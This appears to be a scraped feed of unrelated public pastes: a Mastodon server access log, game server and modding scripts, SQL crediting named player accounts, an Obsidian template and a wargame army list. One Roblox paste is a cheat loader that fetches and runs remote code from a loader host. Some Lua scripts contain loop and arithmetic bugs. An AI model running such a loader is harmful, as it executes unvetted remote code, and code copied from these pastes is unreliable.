Origin""],""X-Ratelimit-Remaining"":[""299""],""Cache-Control"":[""private, no-store""],""X-Request-Id"":[""737aea43-d594-4368-8830-3b32ce0c371d""],""Server"":[""Caddy"",""Mastodon""],""X-Xss-Protection"":[""0""],""Content-Security-Policy"":[""default-src 'none'; frame-ancestors 'none'; form-action 'none'""]}}"
SSycHuLZ,Untitled,swaggboi,JSON,Sunday 8th of June 2025 10:50:13 AM CDT,"{""level"":""error"",""ts"":1749397766.6056633,""logger"":""http.log.access.log0"",""msg"":""handled request"",""request"":{""remote_ip"":""2601:5cf:8601:64e1:3eec:efff:fec3:9ad1"",""remote_port"":""46780"",""proto"":""HTTP/1.1"",""method"":""PATCH"",""host"":""eattherich.club"",""uri"":""/api/v1/accounts/update_credentials"",""headers"":{""User-Agent"":[""HTTP-Thin/0.006""],""Authorization"":[],""Content-Length"":[""897332""],""Content-Type"":[""application/x-www-form-urlencoded""]},""tls"":{""resumed"":false,""version"":772,""cipher_suite"":4865,""proto"":"""",""server_name"":""eattherich.club""}},""user_id"":"""",""duration"":0.88008502,""size"":56,""status"":403,""resp_headers"":{""Vary"":[""Authorization, Origin""],""X-Xss-Protection"":[""0""],""Strict-Transport-Security"":[""max-age=63072000; includeSubDomains""],""Referrer-Policy"":[""same-origin""],""X-Ratelimit-Reset"":[""2025-06-08T15:50:00.601218Z""],""X-Content-Type-Options"":[""nosniff""],""Server"":[""Caddy"",""Mastodon""],""X-Request-Id"":[""c93c3350-abbf-451b-80b9-d742aaa0413f""],""Content-Length"":[""56""],""X-Ratelimit-Remaining"":[""297""],""Cache-Control"":[""private, no-store""],""Alt-Svc"":[""h3=\"":443\""; ma=2592000""],""X-Runtime"":[""0.082311""],""X-Frame-Options"":[""DENY""],""Content-Security-Policy"":[""default-src 'none'; frame-ancestors 'none'; form-action 'none'""],""X-Ratelimit-Limit"":[""300""],""Content-Type"":[""application/json; charset=utf-8""]}}"
q5xP8dX2,CSCO Server Starter Script,P1ayer4312,Batch,Sunday 8th of June 2025 10:14:26 AM CDT,"
@REM #######################################################################################
@REM #######################################################################################
@REM #######################################################################################
@REM #######################################################################################
@REM #######################################################################################

@ECHO off
title CSCO Server Starter

@REM This is a small script that allows creation of a server with each available gamemode

set SERVER_NAME=""My CSCO Server""
set SERVER_PORT=27015
set MAX_PLAYERS=64
set SERVER_DEFAULT_MAP=""de_dust2_csco""
set TICK_RATE=128
@REM 64 or 128

@REM  Available maps:
@REM    as_retreat_csco
@REM    awp_india_csco
@REM    cs_backalley_csco
@REM    cs_militia_csco
@REM    de_dust2_csco
@REM    de_inferno_csco
@REM    de_mirage_csco
@REM    de_nuke_csco
@REM    de_train_csco
@REM    de_vertigo_csco
@REM    fy_iceworld_csco
@REM    fy_pool_day_csco_11
@REM    tr_firingrange_csco
@REM    ar_baggage
@REM    de_shortdust
@REM    dz_blacksite

@REM #######################################################################################
@REM #######################################################################################
@REM #######################################################################################
@REM #######################################################################################
@REM #######################################################################################

echo.
echo.     Choose gamemode number:
echo.
echo.  1) The classic Counter-Strike experience
echo.  2) The classic Condition Zero experience
echo.  3) 5v5 Tournament mode
echo.  4) Shorter Competitive
echo.  5) 2v2 Competitive (Wingman)
echo.  6) Arms Race (GunGame)
echo.  7) Round based GunGame (Demolition)
echo.  8) FFA Deathmatch
echo.  9) Survive waves of bots (Guardian)
echo. 10) Coop - Only works on maps meant for it (CoopStrike)
echo. 11) Battle Royale - Only works on maps meant for it (Danger Zone)
echo. 12) Scouts and knives, low gravity (Flying Scoutsman)
echo. 13) Official retakes gamemode
echo. 14) One in the Chamber
echo. 15) Zombie Mod
echo. 16) Custom (No gamemode)
echo. 17) Retreat (VIP protect) - Normal
echo. 18) Retreat (VIP protect) - Condition Zero
echo.

:INPUT_LOOP
set /p USER_INPUT=""Enter value: ""
IF %USER_INPUT% LEQ 18 (
  IF %USER_INPUT% GEQ 1 (
    goto:SERVER_ARGS
  )
)
echo Invalid value
goto:INPUT_LOOP

:SERVER_ARGS
set ""ARGS=""

IF %USER_INPUT% EQU 1 (
  set ""ARGS=+game_type 0 +game_mode 0""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 2 (
  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 22 +sv_game_mode_flags 4""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 3 (
  set MAX_PLAYERS=10
  set ""ARGS=+game_type 0 +game_mode 1""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 4 (
  set MAX_PLAYERS=10
  set ""ARGS=+game_type 0 +game_mode 1 +sv_game_mode_flags 32""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 5 (
  set MAX_PLAYERS=4
  set ""ARGS=+game_type 0 +game_mode 2""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 6 (
  set ""ARGS=+game_type 1 +game_mode 0""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 7 (
  set ""ARGS=+game_type 1 +game_mode 1""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 8 (
  set ""ARGS=+game_type 1 +game_mode 2""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 9 (
  set ""ARGS=+game_type 4 +game_mode 0""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 10 (
  set ""ARGS=+game_type 4 +game_mode 1""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 11 (
  @REM Here it's hardcoded to be 'dz_blacksite' remove the line below if you want to change the map
  set SERVER_DEFAULT_MAP=""dz_blacksite""
  set ""ARGS=+game_type 6 +game_mode 0""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 12 (
  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 3""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 13 (
  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 12""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 14 (
  set ""ARGS=+game_type 1 +game_mode 2 +sv_skirmish_id 21""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 15 (
  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 23""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 16 (
  set ""ARGS=+game_type 3 +game_mode 0""
  goto:START_SERVER
)
@REM I guess it checks based on map data if it's Retreat or not, hardcoded to ""as_retreat_csco"" for now
IF %USER_INPUT% EQU 17 (
  set SERVER_DEFAULT_MAP=""as_retreat_csco""
  set ""ARGS=+game_type 0 +game_mode 0""
  goto:START_SERVER
)
IF %USER_INPUT% EQU 18 (
  set SERVER_DEFAULT_MAP=""as_retreat_csco""
  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 22 +sv_game_mode_flags 4""
  goto:START_SERVER
)

:START_SERVER
start srcds.exe -game csco/csgo -console -usercon %ARGS% +sv_max_players %MAX_PLAYERS% -maxplayers %MAX_PLAYERS% -maxplayers_override %MAX_PLAYERS% +hostname %SERVER_NAME% +map %SERVER_DEFAULT_MAP% -tickrate %TICK_RATE% -port %SERVER_PORT%"
qVWP9ijb,Zombie,GigaOrts,Lua,Sunday 8th of June 2025 10:04:28 AM CDT,"-- PlayerConnect
function whenLoaded(player)
	warn(""Игрок"", player, ""подключился к игре!"")
	script.Parent.Player.Value = player
	print(script.Parent.Player.Value)
end
game.Players.PlayerAdded:Connect(whenLoaded)

--ZombieSpawn
working = true
local distance = 0
while working do
	for _, player in pairs(game.Players:GetPlayers()) do
		distance = player:DistanceFromCharacter(script.Parent.Position)
		if (distance > 0) and (distance < 50) then
			working = false
		end
	end
	wait(1)
end
wait(2)
D_num = script.Parent.Parent.Quantity
while D_num.Value < 10 do
	if distance < 50 then
		local zombie = game.ServerStorage.Zombie:Clone()
		zombie.Parent = game.Workspace.NPC
		zombie:MoveTo(script.Parent.Position)
		D_num.Value += 1
	end
	local destination = game.Workspace.Data.Player.Value.Character.HumanoidRootPart.Position
	distance = (destination - script.Parent.Position).magnitude
	wait(5)
end


--SeekEnemy
local npc = script.Parent --получаем модель НПС
local humanoid = npc:WaitForChild(""Humanoid"") --получаем гуманоида из модели, с его помощью будем двигать НПС
local rootPart = npc:WaitForChild(""HumanoidRootPart"") --получаем корневую деталь из модели, от неё будем брать позицию НПС
local nearestPlayerPos = nil --создаем переменную для ближайшего игрока
local shortestDistance = 100 -- Большое значение для сравнения

local function getNearestPlayerPos() --функция, которая ищет позицию ближайшего игрока
	for _, player in ipairs(game.Players:GetPlayers()) do --перебираем всех игроков в игре
		local character = player.Character --получаем модель игрока
		if character and character:FindFirstChild(""HumanoidRootPart"") then --если модель найдена и имеет корневую деталь
			local characterRootPos = character.HumanoidRootPart.Position --Получаем позицию игрока
			local distance = (characterRootPos - rootPart.Position).Magnitude --считаем растояние между игроком и НПС
			if distance < shortestDistance then
				shortestDistance = distance --сохраняем новое ближайшее растояние
			end
			if distance < 50 then --если растояние меньше 50 и меньше предыдущего, запоминаем его
				nearestPlayerPos = characterRootPos --сохраняем игрока как ближайшего
			end
		end
	end
	return nearestPlayerPos --возвращаем позицию ближайшего игрока
end

while wait() do --запускаем бесконечный цикл
	local nearestPlayerPos = getNearestPlayerPos() --получаем ближайшего игрока
	if nearestPlayerPos then --если нашли ближайшего игрока
		humanoid:MoveTo(nearestPlayerPos) --двигаем НПС к ближайшему игроку
	end
end

--ZombieAttack
local rarm = script.Parent:FindFirstChild(""RightHand"")
local larm = script.Parent:FindFirstChild(""LeftHand"")
local torso = script.Parent:FindFirstChild(""UpperTorso"")
local Attack_Speed = script.Parent.Parent.AttackSpeed

function dmg(hit)
	if hit.Parent ~= nil then
		local hum = hit.Parent:FindFirstChild(""Humanoid"")
		if hum ~= nil then
			hum.Health = hum.Health - 0.1
		end
		wait(Attack_Speed.Value)

	end
end


rarm.Touched:Connect(dmg)
larm.Touched:Connect(dmg)
torso.Touched:Connect(dmg)"
PquQYaDS,Untitled,Locative,SQL,Sunday 8th of June 2025 09:52:17 AM CDT,"UPDATE bonus SET gold=gold+1000 WHERE id=1399060; -- [Tomford] (GUID: 7123207) Аккаунт: megre (id: 1399060)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1399060, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены 2х2.');

UPDATE bonus SET gold=gold+1000 WHERE id=1891128; -- [Excalibur] (GUID: 6100683) Аккаунт: Swoksaar1990 (id: 1891128)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1891128, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены 2х2.');

UPDATE bonus SET gold=gold+2000 WHERE id=1236003; -- [Форельх] (GUID: 6186742) Аккаунт: 414en (id: 1236003)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1236003, NOW(), 2000, '2000 золотых бонусов за 28-ой сезон арены 3x3.');

UPDATE bonus SET gold=gold+2000 WHERE id=1737032; -- [Drumandbass] (GUID: 6888754) Аккаунт: Dimdim1986 (id: 1737032)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1737032, NOW(), 2000, '2000 золотых бонусов за 28-ой сезон арены 3x3.');

UPDATE bonus SET gold=gold+2000 WHERE id=1285245; -- [Incarnwinx] (GUID: 6804091) Аккаунт: Arrysius (id: 1285245)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1285245, NOW(), 2000, '2000 золотых бонусов за 28-ой сезон арены 3x3.');

UPDATE bonus SET gold=gold+1800 WHERE id=334567; -- [Yohio] (GUID: 3724472) Аккаунт: juansantosfl (id: 334567)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (334567, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3x3.');

UPDATE bonus SET gold=gold+1800 WHERE id=1575905; -- [Oneshot] (GUID: 6927078) Аккаунт: codcodrin (id: 1575905)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1575905, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3х3.');

UPDATE bonus SET gold=gold+1800 WHERE id=1399060; -- [Tomford] (GUID: 7123207) Аккаунт: megre (id: 1399060)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1399060, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3х3.');

UPDATE bonus SET gold=gold+1800 WHERE id=390896; -- [Matma] (GUID: 6667848) Аккаунт: gutol (id: 390896)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (390896, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3х3.');

UPDATE bonus SET gold=gold+1500 WHERE id=390896; -- [Haori] (GUID: 6674791) Аккаунт: gutol (id: 390896)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (390896, NOW(), 1500, '1500 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');

UPDATE bonus SET gold=gold+1500 WHERE id=787774; -- [Lampz] (GUID: 6889670) Аккаунт: rone2 (id: 787774)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (787774, NOW(), 1500, '1500 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');

UPDATE bonus SET gold=gold+1500 WHERE id=1737032; -- [Drumandbass] (GUID: 6888754) Аккаунт: Dimdim1986 (id: 1737032)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1737032, NOW(), 1500, '1500 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');

UPDATE bonus SET gold=gold+1000 WHERE id=1575085; -- [Roelsmvp] (GUID: 3323476) Аккаунт: mygamelevl54 (id: 1575085)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1575085, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');

UPDATE bonus SET gold=gold+1000 WHERE id=1575811; -- [Gløb] (GUID: 7096946) Аккаунт: credittt (id: 1575811)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1575811, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');

UPDATE bonus SET gold=gold+1000 WHERE id=844222; -- [Eldkpujo] (GUID: 2816838) Аккаунт: bibesite97 (id: 844222)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (844222, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');

UPDATE bonus SET gold=gold+3000 WHERE id=1768262; -- [Кубинецтри] (GUID: 6055) Аккаунт: Arkashadps (id: 1768262)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1768262, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');

UPDATE bonus SET gold=gold+2750 WHERE id=1850485; -- [Snapshot] (GUID: 26522) Аккаунт: iasonas78 (id: 1850485)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1850485, NOW(), 2750, '2750 золотых бонусов за 13-ый сезон испытания.');

UPDATE bonus SET gold=gold+3000 WHERE id=1850537; -- [Prasin] (GUID: 6045) Аккаунт: iasonas79 (id: 1850537)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1850537, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');

UPDATE bonus SET gold=gold+3000 WHERE id=1850483; -- [Clopie] (GUID: 26520) Аккаунт: clopyright (id: 1850483)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1850483, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');

UPDATE bonus SET gold=gold+3000 WHERE id=1724886; -- [Эюк] (GUID: 46956) Аккаунт: ganshit (id: 1724886)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1724886, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');

UPDATE bonus SET gold=gold+1000 WHERE id=356268; -- [Vebbstor] (GUID: 148828) Аккаунт: kronbog (id: 356268)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (356268, NOW(), 1000, '1000 золотых бонусов за 13-ый сезон испытания.');"
iJV2HT8c,CobbleGen,ChicagoFire3,Lua,Sunday 8th of June 2025 09:49:17 AM CDT,"require ""GenUtil""

print('Begin Cobble gen...')

while true do
  ReFuel(false)
  turtle.digDown()
  EmptyForward(1)
end"
h1uPUpSd,GenUtil,ChicagoFire3,Lua,Sunday 8th of June 2025 09:46:42 AM CDT,"function ReFuel(Silent)
  if not Silent then
    print('Refueling...')
  end
  local SavedSlot = turtle.getSelectedSlot()
  turtle.select(1)
  if not Silent then
    local ItemCount = turtle.getItemCount()
  end
  turtle.refuel()
  if not Silent then
    local FuelCount = turtle.getFuelLevel()
    local NewItemCount = turtle.getItemCount()
    print('New FuelCount: ', tostring(FuelCount))
    print('Items consumed: ', tostring(ItemCount - NewItemCount))
  end
  turtle.select(SavedSlot)
end

function EmptyForward(SkipSlotCount)
  print('Emptying inventory besides: ', tostring(SkipSlotCount))
  local SavedSlot = turtle.getSelectedSlot()
  local i = SkipSlotCount+1

  while i < 17 do
    turtle.select(i)
    turtle.drop()
    i = i-1
  end
  turtle.select(SavedSlot)
end"
SwZYn783,garden script egg,Guitar1203,Lua,Sunday 8th of June 2025 08:28:24 AM CDT,"getgenv().PETS = {
     ""Red Fox""
}

loadstring(game:HttpGet(""https:api.luarmor.net/files/v3/loaders/19919f511ace07999bf5a772208c8bef.lua""))()"
RQPuDmJt,Obsidian template,Icalized,JavaScript,Sunday 8th of June 2025 08:04:34 AM CDT,"<%*
//Get file title
let title = tp.file.title;
if(title.toLowerCase().startsWith(""untitled"")){
title = await tp.system.prompt(""Title:"");
await tp.file.rename(title);
}

// --- Get Category ---
let category = await tp.system.prompt(""Category:"");
if (category === """"){
	// Force format
	category += ""/general"";
}
const folder = category;

// --- Create Folder ---
const folderPath = `${folder}/`;
if (!await app.vault.adapter.exists(folderPath)) {
  await app.vault.createFolder(folderPath);
}

// --- Move Note ---
await tp.file.move(`${folderPath}${title}.md`);


%>

Created : <% tp.date.now(""dddd, MMMM Do YYYY, h:mm:ss a"") %>
Curated Links :
Auto Links:

___
<% tp.file.cursor() %>

# References
"
UYA0UFCT,Ottawa R3 TS,TableTopLive,PHP,Sunday 8th of June 2025 07:45:14 AM CDT,"Ottawa Teams (2000 points)

Thousand Sons
Strike Force (2000 points)
Grand Coven


CHARACTERS

Daemon Prince of Tzeentch with Wings (195 points)
• Warlord
• 1x Dark Blessing
1x Hellforged weapons
1x Infernal cannon
• Enhancement: Eldritch Vortex of E’Taph

Exalted Sorcerer on Disc of Tzeentch (115 points)
• 1x Arcane Fire
1x Force weapon
1x Inferno bolt pistol
• Enhancement: Incandaeum

Infernal Master (105 points)
• 1x Fires of the Abyss
1x Force weapon
1x Inferno bolt pistol
• Enhancement: Umbralefic Crystal

Infernal Master (85 points)
• 1x Fires of the Abyss
1x Force weapon
1x Inferno bolt pistol

Infernal Master (85 points)
• 1x Fires of the Abyss
1x Force weapon
1x Inferno bolt pistol

Sorcerer (75 points)
• 1x Force weapon
1x Inferno bolt pistol
1x Pandaemonic Delusion
1x Prosperine khopesh

Sorcerer (75 points)
• 1x Force weapon
1x Inferno bolt pistol
1x Pandaemonic Delusion
1x Prosperine khopesh

Tzaangor Shaman (55 points)
• 1x Baleful Devolution
1x Force stave


BATTLELINE

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
1x Soulreaper cannon
3x Warpflamer

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
1x Soulreaper cannon
3x Warpflamer

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
1x Soulreaper cannon
3x Warpflamer

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
3x Inferno boltgun
1x Soulreaper cannon

Rubric Marines (100 points)
• 1x Aspiring Sorcerer
• 1x Force weapon
1x Malefic Curse
1x Warpflame pistol
• 4x Rubric Marine
• 4x Close combat weapon
1x Icon of Flame
3x Inferno boltgun
1x Soulreaper cannon


DEDICATED TRANSPORTS

Chaos Rhino (90 points)
• 1x Armoured tracks
1x Havoc launcher
1x Inferno combi-bolter
1x Inferno combi-weapon

Chaos Rhino (90 points)
• 1x Armoured tracks
1x Havoc launcher
1x Inferno combi-bolter
1x Inferno combi-weapon


OTHER DATASHEETS

Forgefiend (140 points)
• 3x Ectoplasma cannon
1x Forgefiend claws

Mutalith Vortex Beast (160 points)
• 1x Betentacled maw
1x Mutalith claws
1x Warp vortex

Tzaangor Enlightened with Fatecaster Greatbows (80 points)
• 1x Aviarch
• 1x Close combat weapon
1x Fatecaster greatbow
• 5x Enlightened
• 5x Close combat weapon
5x Fatecaster greatbow

Tzaangor Enlightened with Fatecaster Greatbows (80 points)
• 1x Aviarch
• 1x Close combat weapon
1x Fatecaster greatbow
• 5x Enlightened
• 5x Close combat weapon
5x Fatecaster greatbow

Tzaangors (70 points)
• 1x Twistbray
• 1x Tzaangor blades
• 9x Tzaangor
• 1x Brayhorn
1x Herd banner
9x Tzaangor blades"
RWqZM1L8,Pupupupu,maz1lovo,Lua,Sunday 8th of June 2025 07:36:46 AM CDT,"--[[
The specified software is distributed under the CC0 license
No Rights Reserved
]] --
 
local ore_dict = {
    {
        ""Железная руда"",
        ""Железный слиток"",
        take = {name = ""minecraft:iron_ore"", damage = 0},
        give = {name = ""minecraft:iron_ingot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Золотая руда"",
        ""Золотой слиток"",
        take = {name = ""minecraft:gold_ore"", damage = 0},
        give = {name = ""minecraft:gold_ingot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Медная руда"",
        ""Медный слиток"",
        take = {name = ""IC2:blockOreCopper"", damage = 0},
        give = {name = ""IC2:itemIngot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Медная руда"",
        ""Медный слиток"",
        take = {name = ""ProjRed:Exploration:projectred.exploration.ore"", damage = 3},
        give = {name = ""IC2:itemIngot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Медная руда"",
        ""Медный слиток"",
        take = {name = ""Forestry:resources"", damage = 1},
        give = {name = ""IC2:itemIngot"", damage = 0},
        rate = {take = 4, give = 9}
    },
    {
        ""Оловянная руда"",
        ""Оловянный слиток"",
        take = {name = ""IC2:blockOreTin"", damage = 0},
        give = {name = ""IC2:itemIngot"", damage = 1},
        rate = {take = 4, give = 9}
    },
    {
        ""Оловянная руда"",
        ""Оловянный слиток"",
        take = {name = ""Forestry:resources"", damage = 2},
        give = {name = ""IC2:itemIngot"", damage = 1},
        rate = {take = 4, give = 9}
    },
    {
        ""Оловянная руда"",
        ""Оловянный слиток"",
        take = {name = ""ProjRed:Exploration:projectred.exploration.ore"", damage = 4},
        give = {name = ""IC2:itemIngot"", damage = 1},
        rate = {take = 4, give = 9}
    },
    {
        ""Свинцовая руда"",
        ""Свинцовый слиток"",
        take = {name = ""IC2:blockOreLead"", damage = 0},
        give = {name = ""IC2:itemIngot"", damage = 5},
        rate = {take = 4, give = 9}
    },
    {
        ""Серебряная руда"",
        ""Серебрянный слиток"",
        take = {name = ""ProjRed:Exploration:projectred.exploration.ore"", damage = 5},
        give = {name = ""IC2:itemIngot"", damage = 6},
        rate = {take = 4, give = 9}
    },
    {
        ""Серебряная руда"",
        ""Серебрянный слиток"",
        take = {name = ""ThermalFoundation:Ore"", damage = 2},
        give = {name = ""IC2:itemIngot"", damage = 6},
        rate = {take = 4, give = 9}
    },
    {
        ""Серебрянная руда"",
        ""Серебрянный слиток"",
        take = {name = ""ThermalFoundation:Ore"", damage = 4},
        give = {name = ""ThermalFoundation:material"", damage = 36},
        rate = {take = 1, give = 2}
    }
}
 
local unicode = require(""unicode"")
local computer = require(""computer"")
local com = require(""component"")
local event = require(""event"")
local me = com.isAvailable(""me_interface"") and com.me_interface or error(""нет ме интерфейса"")
local pim = com.isAvailable(""pim"") and com.pim or error(""нет пима"")
 
local gpu = com.gpu
local w, h = 80, 50
local defBG, defFG = gpu.getBackground(), gpu.getForeground()
gpu.setResolution(w, h)
 
local function center(height, text, color)
    gpu.setForeground(color)
    gpu.set(math.floor(w / 2 - unicode.len(text) / 2), height, text)
end
 
local function populateQty()
    local totalOre = 0
    for i, ore in pairs(ore_dict) do
        local fingerprint = {id = ore.give.name, damage = ore.give.damage}
        local item = me.getItemDetail(fingerprint).basic()
        if item == nil then
            return 0
        else
            ore.sizeOfStack = item.max_size
            ore.qty = item.qty
            totalOre = totalOre + item.qty
        end
    end
    return totalOre
end
 
local function displayOres()
    local line = 2
    for i, ore in pairs(ore_dict) do
        local print_row = line + (i)
 
        gpu.setForeground(0x00ff00)
        gpu.set(5, print_row, ore[1])
        gpu.set(42, print_row, ore[2])
 
        gpu.setForeground(0xFF00FF)
        gpu.set(28, print_row, tostring(ore.rate.take))
        gpu.set(34, print_row, tostring(ore.rate.give))
        gpu.set(73, print_row, tostring(ore.qty))
 
        gpu.setForeground(0xFFFF00)
        gpu.set(30, print_row, ""-->"")
        gpu.set(63, print_row, ""Доступно:"")
        gpu.setForeground(0x202020)
        gpu.set(2, print_row + 1, string.rep(""═"", w - 2))
        line = line + 1
    end
end
 
local function updateOres()
    local totalOre = populateQty()
    gpu.fill(1, 1, w, h - 16, "" "")
    if totalOre == 0 then
        gpu.fill(1, 1, w, h - 15, "" "")
        center(h - 15, ""Нет соединения с МЭ"", 0xff0000)
    else
        displayOres()
    end
end
 
local function giveItemFromMe(item, dmg, amount)
    local fingerprint = {id = item, dmg = dmg}
    local err, res = pcall(me.exportItem, fingerprint, ""UP"", amount)
    if err == true then
        return res.size
    end
end
 
local function giveIngot(toGive, ore)
    local totalGive = 0
    local givePreIteration = 0
    while totalGive < toGive do
        if toGive - totalGive > 64 then
            givePreIteration = ore.sizeOfStack
        else
            givePreIteration = toGive - totalGive
        end
 
        local gived = giveItemFromMe(ore.give.name, ore.give.damage, givePreIteration)
 
        totalGive = totalGive + gived
        if gived == 0 then
            gpu.fill(1, h - 15, w, 2, "" "")
            center(h - 15, ""Oсвободите место в инвентаре"", 0xff0000)
            center(h - 14, ""Ожидаю выдать "" .. tostring(toGive - totalGive) .. "" "" .. ore[2], 0xFFFFFF)
            os.sleep(1)
        end
        gpu.fill(1, h - 15, 2, h, "" "")
    end
end
 
local function exchangeOre(slot, ore)
    local curSlot = pim.getStackInSlot(slot)
    if curSlot == nil then
        center(h - 14, ""Вы сошли с PIM, обмен прерван. (Не удалось прочесть слот)"", 0xff0000)
        os.sleep(0.5)
        return
    end
    local userOreQty = curSlot.qty
    local takeQty = userOreQty - (userOreQty % ore.rate.take)
    local giveQty = userOreQty * ore.rate.give
    if ore.qty < giveQty then
        gpu.fill(1, h - 14, w, 1, "" "")
        center(h - 14, ""Недостаточно слитков для обмена <"" .. ore[1] .. "">"", 0xff0000)
        os.sleep(0.5)
        return
    end
    -- Количетсво могло измениться..
    local takedOre = pim.pushItem(""DOWN"", slot, takeQty)
 
    if takedOre == nil then
        gpu.fill(1, h - 14, w, 1, "" "")
        center(h - 14, ""Вы сошли с PIM, обмен прерван. (Не удалось извлечь руду)"", 0xff0000)
        os.sleep(0.5)
    elseif takedOre == 0 then
        gpu.fill(1, h - 14, w, 1, "" "")
        center(h - 14, ""В выбраном слоте руды нет.. А была.. Хмм..."", 0x505050)
    else
        local giveQty = (takedOre // ore.rate.take) * ore.rate.give
        gpu.fill(1, h - 15, w, 2, "" "")
        center(h - 14, ""Меняю  "" .. takedOre .. ""  "" .. ore[1] .. ""  на  "" .. giveQty .. ""  "" .. ore[2], 0xffffff)
        giveIngot(giveQty, ore)
    end
end
 
local function checkInventory()
    local size = pim.getInventorySize()
    local data = pim.getAllStacks(0)
 
    for slot = 1, size do
        if data[slot] then
            for i, ore in pairs(ore_dict) do
                if data[slot].id == ore.take.name and data[slot].dmg == ore.take.damage then
                    exchangeOre(slot, ore)
                end
            end
        end
    end
 
    updateOres()
 
    if pim.getInventoryName() ~= ""pim"" then
        gpu.fill(1, h - 15, w, 2, "" "")
        center(h - 15, ""Обмен окончен! Приходите ещё!"", 0xffffff)
 
        checkInventory()
    else
        -- Может быть, мы не поймали событие когда юзер ушел
        event.push(""player_off"")
    end
end
 
function handleEvent(eventID, ...)
    local args = {...}
    if eventID == ""interrupted"" then
        gpu.setBackground(defBG)
        gpu.setForeground(defFG)
        gpu.fill(1, 1, w, h, "" "")
        os.exit()
        return true
    elseif eventID == ""player_on"" then
        gpu.fill(1, h - 15, w, 1, "" "")
        center(h - 15, ""Приветствую, "" .. args[1] .. ""! Начинаю обмен"", 0xffffff)
        updateOres()
        checkInventory()
    elseif eventID == ""player_off"" then
        gpu.fill(1, h - 15, w, 1, "" "")
        center(h - 15, ""Для обмена встаньте на PIM и не сходите до окончания обмена"", 0xffffff)
        updateOres()
    end
end
 
function drawStat()
    gpu.setForeground(0x444444)
    gpu.set(
        2,
        h - 1,
        string.format(
            ""RAM: %.1fkB / %.1fkB"",
            (computer.totalMemory() - computer.freeMemory()) / 1024,
            computer.totalMemory() / 1024
        )
    )
end
 
local oreTimeFn = function()
    updateOres()
